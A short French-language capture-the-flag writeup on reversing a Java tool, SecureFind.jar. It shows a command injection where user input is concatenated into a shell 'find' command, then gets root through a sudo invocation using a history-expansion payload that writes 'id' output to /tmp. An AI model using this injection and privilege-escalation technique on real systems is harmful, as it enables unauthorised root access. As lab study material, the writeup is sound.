# Writeup

## Reverse SecureFind.jar

```
scp -P 2223 test@localhost:/home/test/SecureFind.jar .
```

Reverse avec JD-GUI pour trouver la vulnérabilité : Injection de commande

```java
os.write(("find . -type f -regex \"" + regex + "\"").getBytes());
```

L'absence de filtrage sur "!" nous permet d'intéagir avec l'historique et ainsi de trouver cette ligne dans l'historique de root :


```
test@60be70123487:~$ sudo /usr/local/openjdk-24/bin/java -jar /home/test/SecureFind.jar '!2'
root@60be70123487:/home/test# find . -type f -regex "!2"
find . -type f -regex "echo Mr Doe told me to block these characters : &;|#`! and $"
```

En utilisant la bonne syntaxe on peut ainsi utiliser le caractère '$' pour devenir root.

```
sudo /usr/local/openjdk-24/bin/java -jar /home/test/SecureFind.jar '!2:12(id > /tmp/root)'
```
